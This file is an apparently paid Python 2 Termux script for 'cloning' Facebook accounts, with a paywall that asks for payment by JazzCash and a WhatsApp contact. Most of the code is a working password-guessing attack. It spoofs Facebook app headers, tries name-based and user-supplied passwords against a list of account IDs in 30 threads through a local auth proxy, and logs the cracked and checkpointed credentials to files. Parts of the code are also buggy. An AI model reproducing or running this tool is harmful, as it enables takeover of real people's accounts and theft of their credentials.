# coding=utf-8
import os, sys, time, base64
from os import system
from time import sleep

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


try:
    import requests
except ImportError:
    system('pip2 install requests > /dev/null 2>&1 &')
    system('pip2 install requests > /dev/null 2>&1 &')


try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 rsa.py')



from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
p = '\x1b[0;37m'
m = '\x1b[0;31m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'
b = '\x1b[0;34m'
u = '\x1b[0;35m'
o = '\x1b[0;36m'
if 'linux' in sys.platform.lower():
    N = '\x1b[0m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
else:
    N = ''
    G = ''
    O = ''
    R = ''


    os.system('rm -rf .txt')
    for n in range(5000):
        nmbr = random.randint(1111111, 9999999)
        sys.stdout = open('.txt', 'a')
        print nmbr
        sys.stdout.flush()



def f():
	for e in z + '\n':
	    sys.stdout.write(e)
	    sys.stdout.flush()
	    time.sleep(0.0001)
def lol():
	os.system('clear')
	print 'Need storage permission'
	print ''
	print "Directory '~/storage' is going to be wiped."
	print 'No storage contents will be touched'
	print ''
	print ''
	s = raw_input('       \x1b[0;97m Do you want to continue ? (y/n): ')
	if s == 'y':
	    os.system('termux-setup-storage -y')
	    hira()
	if s == 'n':
	    os.system('clear')
	    gf()
	else:
	    os.system('clear')
	    lol()
def hira():
	os.system('clear')
	logo()
	print ''
	print ''
	print ''
	os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
	os.system('echo -e "      CHEKING YOUR APPROVAL PERMISSION"  | lolcat  -a -d 20 -s 10000')
	os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
	print ''
	load('               CHEKING >--')
	try:
	    rana = open('/data/data/com.termux/files/home/.termux.txt', 'r').read()
	except (KeyError, IOError):
	    hira_n()
	
	hira = requests.get('https://raw.githubusercontent.com/ranaonfire/apv/main/user.txt').text
	if rana in hira:
	    os.system('clear')
	    os.system('echo -e "THANK YOU YOUR PAYMENT RECEIVED"  | lolcat  -a -d 20 -s 10000')
	    time.sleep(4)
	    log_menu()
	else:
	    os.system('clear')
	    logo()
	    print ''
	    print ''
	    print ''
	    print ''
	    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
	    print '\x1b[1;91m            YOUR PAYMENT NOT RECEIVED'
	    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
	    print ''
	    print ''
	    print '\x1b[1;92m          YOUR ID : ' + rana
	    print ''
	    print '\x1b[1;97m'
	    print '      PRESS ENTER AND SEND THIS IS TO OWNER'
	    print ''
	    print '         OWNER CHARGE 350-RS FOR APPROVAL'
	    print ''
	    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
	    print '\x1b[1;97m'
	    print '            PRESS ENTER TO CONTACT ADMIN'
	    raw_input('')
	    os.system('xdg-open https://wa.me/+923092760811')
	    lol()
def hira_n():
	os.system('clear')
	logo()
	print ''
	print ''
	print ''
	print ''
	os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
	print '\x1b[1;91m                 THIS IS PAID TOOL'
	os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
	print ''
	print '\x1b[1;91m              JAZZ CASH : 03092760811'
	print ''
	print '\x1b[1;91m           SEND 350-RS AN SEND SCREENSHOT'
	print ''
	print '\x1b[1;91m          THEN COPY YOUR ID SEND TO ADMIN'
	mahi = uuid.uuid4().hex[:20]
	print ''
	print '\x1b[1;92m           YOUR ID : ' + mahi
	lol = open('/data/data/com.termux/files/home/.termux.txt', 'w')
	lol.write(mahi)
	lol.close()
	print ''
	os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
	print '\x1b[1;97m'
	print '            PRESS ENTER TO CONTACT ADMIN'
	raw_input('')
	os.system('xdg-open https://wa.me/+923092760811')
	lol()
def jalan():
	for e in z + '\n':
	    sys.stdout.write(e)
	    sys.stdout.flush()
	    time.sleep(0.03)
def lo():
	os.system('clear')
	logo()
	print ''
	print '         LOADING PLEASE WAIT'
	print ''
	os.system('cd ... && npm install')
	os.system('fuser -k 5000/tcp &')
	os.system('#')
	os.system('cd ... && node index.js &')
	print ''
	print ''
	time.sleep(10)
	print '     LOCALHOST IS RUNING'
	log_menu()
def load():
	lix = [
	 '/', '-', '\xe2\x95\xb2', '|']
	for i in range(5):
	    for x in range(len(lix)):
	        sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
	        time.sleep(0.2)
	        sys.stdout.flush()
def log_menu():
	os.system('clear')
	logo()
	print '\x1b[1;37m'
	print ''
	print ''
	print ''
	print('[1]  Start  Cloning')
	print('[0]  Back to Menu')
	log_menu_s()
def log_menu_s():
	s = raw_input(h + '\n[' + m + '' + h + '] \x1b[0;34mSelect :')
	if s == '1':
	    choice_select()
	elif s == '0':
	    os.system('python2 rsa.py')
	elif s == '2':
	    lo()
	else:
	    print ''
	    print '\x1b[0;91mSelect Valid \x1b[0;97mOption.'
	    print ''
	    log_menu_s()
def logo():
	os.system('echo -e "\td8888b. .d8888.  .d8b.  \n\t88   8D 88   YP d8   8b \n\t88oobY   8bo.   88ooo88 \n\t88 8b      Y8b. 88~~~88 \n\t88  88. db   8D 88   88 \n\t88   YD  8888Y  YP   YP \n\t\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\n\t\xe2\x94\x82    RSA PROGRAMER    \xe2\x94\x82\n\t\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98 " | lolcat -a -d 20 -s 10000 \n')
def choice_select():
    select = raw_input('\x1b[1;37m\x1b[1;33mChoose option \x1b[91m: \x1b[0;97m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print("")
        p1 = raw_input(' \x1b[1;97m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;97m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;97m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;97m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;97m[5]Password: ')
        pass6 = raw_input(' \x1b[1;97m[6]Password: ')
        pass7 = raw_input(' \x1b[1;97m[7]Password: ')
        pass8 = raw_input(' \x1b[1;97m[8]Password: ')
        try:
            idlist = raw_input(' \x1b[1;96m[+] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\n' + w + '[' + red + '!' + w + '] File not Found!'
            raw_input(w + '[' + red + '!' + w + '] Press enter to back! ')
            login_choice()

    elif select == '0':
        menu()
    else:
        print w + '[' + red + '!' + w + '] Wrong input! '
        time.sleep(1)
        menu()
    print ' \x1b[1;92mTotal ids: \x1b[1;92m ' + str(len(id))
    time.sleep(0.5)
    print '\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Crack Running...'
    time.sleep(0.5)
    os.system('echo -e "-----------------------------------------------" | lolcat  -a -d 30 -s 580')
    os.system('echo -e "    (**) Cloning Start Please Wait (**)" | lolcat  -a -d 30 -s 580')
    os.system('echo -e "-----------------------------------------------" | lolcat  -a -d 30 -s 580')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/rana_ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;34m[CP] ' + uid + ' | ' + pass1
                cp = open('/sdcard/ids/cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/rana_ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;34m[CP] ' + uid + ' | ' + pass2
                    cp = open('/sdcard/ids/cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/rana_ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;34m[CP] ' + uid + ' | ' + pass3
                        cp = open('/sdcard/ids/cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/rana_ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;34m[CP] ' + uid + ' | ' + pass4
                            cp = open('/sdcard/ids/cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/rana_ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;34m[CP] ' + uid + ' | ' + pass5
                                cp = open('/sdcard/ids/cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/rana_ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[CP] ' + uid + ' | ' + pass6
                                    cp = open('/sdcard/ids/cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/rana_ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;34m[CP] ' + uid + ' | ' + pass7
                                        cp = open('/sdcard/ids/cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/rana_ok.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;34m[CP] ' + uid + ' | ' + pass8
                                            cp = open('/sdcard/ids/cp.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    os.system('echo -e "-----------------------------------------------" | lolcat  -a -d 30 -s 580')
    print w + '[' + g + '\xe2\x9c\x94' + w + '] Crack Done! '
    print w + '[' + g + '\xe2\x9c\x94' + w + '] Total OK/CP : '  + str(len(oks)) + '/' + str(len(cps))
    raw_input(w + '[' + g + '!' + w + '] Press enter to back')
    log_menu_s()


def gf():
	os.system("clear")
	print("")
	print("")
	print("")
	print("")
	try:
		tok = open('/data/data/com.termux/files/home/.data.txt', 'r').read()
		dec = base64.b64decode(tok)
		if len(dec) < 44:
		    not_reg()
		r = requests.get("https://raw.githubusercontent.com/Bhola-record/.../main/rana.txt").text
		if dec in r:
			log_menu()
		else:
		    logo()
		    print ""
		    print ("")
		    print 47* '-'
		    print ("\x1b[1;91m       You dont Have RSA Subscription\x1b[1;97m")
		    print 47* '-'
		    print '\x1b[1;97m'
		    print ''
		    print ' \x1b[1;93mPLEASE COPY YOUR TOKEN AN SEND TO ADMIN\x1b[1;97m'
		    print ''
		    print(' Token : \x1b[1;92m'+dec+'')
		    print '\x1b[1;97m'
		    print 47* '-'
		    print ' If You want To Buy Subscription Press Enter'
		    print ' Subscription Charges (350rs)'
		    print ' Admin WhatsApp : +923092760811'
		    print 47* '-'
		    print ''
		    print "\x1b[1;97m"
		    print ""
		    print ''
		    raw_input ('Press Enter To Chek Subscription')
		    os.system('xdg-open https://wa.me/+923092760811')
		    gf()
	except (IOError):
	    not_reg()
	except requests.exceptions.ConnectionError:
	    print('\n\n\nTurn on Data\n\n\n')
	    sys.exit()
def not_reg():
    logo()
    print ""
    print ("")
    print 47* '-'
    print ("\x1b[1;91m       You dont Have RSA Subscription\x1b[1;97m")
    print 47* '-'
    print '\x1b[1;97m'
    print ''
    string_token = 'abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    v_token = ''.join((random.choice(string_token)) for x in range(44))
    v_token_save = open('/data/data/com.termux/files/home/.data.txt', 'w')
    v_token_save.write(base64.b64encode(v_token))
    v_token_save.close()
    print ''
    print ' \x1b[1;93mPLEASE COPY YOUR TOKEN AN SEND TO ADMIN\x1b[1;97m'
    print ''
    print' Token : \x1b[1;92m'+v_token
    print '\x1b[1;97m'
    print 47* '-'
    print ' If You want To Buy Subscription Press Enter'
    print ' Subscription Charges (350rs)'
    print ' Admin WhatsApp : +923092760811'
    print 47* '-'
    print ''
    print "\x1b[1;97m"
    print ""
    print ''
    os.system('xdg-open https://wa.me/+923092760811')
    
    
if __name__ == '__main__':
    lo()
